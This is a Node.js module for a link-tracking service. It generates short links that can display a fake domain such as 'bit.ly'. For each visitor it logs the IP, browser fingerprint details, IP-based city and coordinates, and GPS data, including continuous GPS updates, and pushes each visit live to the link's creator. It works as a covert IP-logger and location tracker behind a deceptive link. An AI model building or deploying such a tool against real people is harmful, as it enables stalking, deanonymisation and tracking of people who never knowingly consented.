/**
 * Link Intelligence Tracker Engine
 * Generates tracking links, records visits with IP geolocation,
 * and provides real-time visit data.
 */

const http = require('http');
const https = require('https');
const crypto = require('crypto');

// In-memory store: { linkId: { destination, created, visits: [], alias, disguiseDomain } }
const trackingLinks = new Map();

// Alias → linkId reverse lookup
const aliasToId = new Map();

// SSE clients per link: { linkId: Set<res> }
const sseClients = new Map();

/**
 * Fetch JSON from URL (http/https)
 */
function fetchJSON(url) {
    return new Promise((resolve, reject) => {
        const mod = url.startsWith('https') ? https : http;
        mod.get(url, { timeout: 5000 }, (res) => {
            let data = '';
            res.on('data', (c) => (data += c));
            res.on('end', () => {
                try { resolve(JSON.parse(data)); }
                catch { reject(new Error('Invalid JSON')); }
            });
        }).on('error', reject).on('timeout', function () { this.destroy(); reject(new Error('Timeout')); });
    });
}

/**
 * Generate short random ID
 */
function generateId() {
    return crypto.randomBytes(4).toString('hex');
}

/**
 * Generate a short human-readable alias (6 chars, alphanumeric)
 */
function generateAlias() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let alias = '';
    const bytes = crypto.randomBytes(6);
    for (let i = 0; i < 6; i++) {
        alias += chars[bytes[i] % chars.length];
    }
    return alias;
}

/**
 * Create a new tracking link
 * @param {string} destinationUrl
 * @param {object} [options]
 * @param {string} [options.customAlias] - Custom short alias (auto-generated if omitted)
 * @param {string} [options.disguiseDomain] - Fake domain for display (e.g. 'bit.ly')
 */
function createLink(destinationUrl, options = {}) {
    const id = generateId();
    let alias = options.customAlias ? options.customAlias.trim() : '';

    // Validate custom alias
    if (alias) {
        if (!/^[a-zA-Z0-9_-]{2,32}$/.test(alias)) {
            return { error: 'Alias must be 2-32 characters (letters, numbers, hyphens, underscores).' };
        }
        if (aliasToId.has(alias)) {
            return { error: 'This alias is already taken. Try another one.' };
        }
    } else {
        // Generate a unique alias
        alias = generateAlias();
        while (aliasToId.has(alias)) alias = generateAlias();
    }

    const disguiseDomain = options.disguiseDomain || '';

    trackingLinks.set(id, {
        id,
        alias,
        disguiseDomain,
        destination: destinationUrl,
        created: new Date().toISOString(),
        visits: [],
    });
    aliasToId.set(alias, id);

    return { id, alias, disguiseDomain, destination: destinationUrl };
}

/**
 * Get all tracking links (summary)
 */
function getAllLinks() {
    const links = [];
    for (const [id, data] of trackingLinks) {
        links.push({
            id,
            alias: data.alias || '',
            disguiseDomain: data.disguiseDomain || '',
            destination: data.destination,
            created: data.created,
            visitCount: data.visits.length,
        });
    }
    return links.sort((a, b) => new Date(b.created) - new Date(a.created));
}

/**
 * Get link details + all visits
 */
function getLinkData(linkId) {
    return trackingLinks.get(linkId) || null;
}

/**
 * Delete a tracking link
 */
function deleteLink(linkId) {
    const link = trackingLinks.get(linkId);
    if (link && link.alias) aliasToId.delete(link.alias);
    trackingLinks.delete(linkId);
    sseClients.delete(linkId);
}

/**
 * Look up a link by its alias
 */
function getLinkByAlias(alias) {
    const id = aliasToId.get(alias);
    if (!id) return null;
    return trackingLinks.get(id) || null;
}

/**
 * Record a visit from the tracking page
 */
async function recordVisit(linkId, visitorInfo) {
    const link = trackingLinks.get(linkId);
    if (!link) return null;

    const visit = {
        id: crypto.randomBytes(6).toString('hex'),
        timestamp: new Date().toISOString(),
        ip: visitorInfo.ip || 'Unknown',
        userAgent: visitorInfo.userAgent || 'Unknown',
        language: visitorInfo.language || 'Unknown',
        timezone: visitorInfo.timezone || 'Unknown',
        screen: visitorInfo.screen || 'Unknown',
        referrer: visitorInfo.referrer || 'Direct',
        platform: visitorInfo.platform || 'Unknown',
        cookiesEnabled: visitorInfo.cookiesEnabled ?? false,
        doNotTrack: visitorInfo.doNotTrack ?? false,
        // Parsed from user agent
        browser: parseUserAgent(visitorInfo.userAgent).browser,
        os: parseUserAgent(visitorInfo.userAgent).os,
        device: parseUserAgent(visitorInfo.userAgent).device,
        // Geolocation (IP-based)
        geo: null,
        // GPS (if granted)
        gps: visitorInfo.gps || null,
    };

    // Get IP geolocation
    try {
        const geoData = await fetchJSON(
            `http://ip-api.com/json/${visit.ip}?fields=status,country,countryCode,regionName,city,lat,lon,isp,org,as,timezone`
        );
        if (geoData.status === 'success') {
            visit.geo = {
                country: geoData.country,
                countryCode: geoData.countryCode,
                region: geoData.regionName,
                city: geoData.city,
                lat: geoData.lat,
                lng: geoData.lon,
                isp: geoData.isp,
                org: geoData.org,
                as: geoData.as,
                timezone: geoData.timezone,
            };
        }
    } catch {
        // IP geolocation unavailable — ok
    }

    link.visits.push(visit);

    // Notify SSE clients
    const clients = sseClients.get(linkId);
    if (clients) {
        const eventData = JSON.stringify(visit);
        for (const client of clients) {
            try {
                client.write(`data: ${eventData}\n\n`);
            } catch { /* client disconnected */ }
        }
    }

    return visit;
}

/**
 * Update GPS for an existing visit (continuous tracking)
 */
function updateGPS(linkId, visitId, gpsData) {
    const link = trackingLinks.get(linkId);
    if (!link) return false;

    const visit = link.visits.find((v) => v.id === visitId);
    if (!visit) return false;

    visit.gps = gpsData;
    visit.lastGpsUpdate = new Date().toISOString();

    // Notify SSE clients
    const clients = sseClients.get(linkId);
    if (clients) {
        const eventData = JSON.stringify({ type: 'gps-update', visitId, gps: gpsData });
        for (const client of clients) {
            try {
                client.write(`data: ${eventData}\n\n`);
            } catch { /* client disconnected */ }
        }
    }

    return true;
}

/**
 * Register SSE client for a link
 */
function addSSEClient(linkId, res) {
    if (!sseClients.has(linkId)) sseClients.set(linkId, new Set());
    sseClients.get(linkId).add(res);
}

/**
 * Remove SSE client
 */
function removeSSEClient(linkId, res) {
    const clients = sseClients.get(linkId);
    if (clients) clients.delete(res);
}

/**
 * Parse User-Agent string into browser, OS, device
 */
function parseUserAgent(ua) {
    if (!ua) return { browser: 'Unknown', os: 'Unknown', device: 'Unknown' };

    let browser = 'Unknown';
    if (/Edg\//i.test(ua)) browser = 'Edge';
    else if (/OPR|Opera/i.test(ua)) browser = 'Opera';
    else if (/Chrome/i.test(ua)) browser = 'Chrome';
    else if (/Firefox/i.test(ua)) browser = 'Firefox';
    else if (/Safari/i.test(ua)) browser = 'Safari';
    else if (/MSIE|Trident/i.test(ua)) browser = 'IE';

    let os = 'Unknown';
    if (/Windows/i.test(ua)) os = 'Windows';
    else if (/Mac OS X/i.test(ua)) os = 'macOS';
    else if (/Android/i.test(ua)) os = 'Android';
    else if (/iPhone|iPad/i.test(ua)) os = 'iOS';
    else if (/Linux/i.test(ua)) os = 'Linux';
    else if (/CrOS/i.test(ua)) os = 'ChromeOS';

    let device = 'Desktop';
    if (/Mobile|Android.*Mobile|iPhone/i.test(ua)) device = 'Mobile';
    else if (/iPad|Tablet|Android(?!.*Mobile)/i.test(ua)) device = 'Tablet';

    return { browser, os, device };
}

module.exports = {
    createLink,
    getAllLinks,
    getLinkData,
    getLinkByAlias,
    deleteLink,
    recordVisit,
    updateGPS,
    addSSEClient,
    removeSSEClient,
};
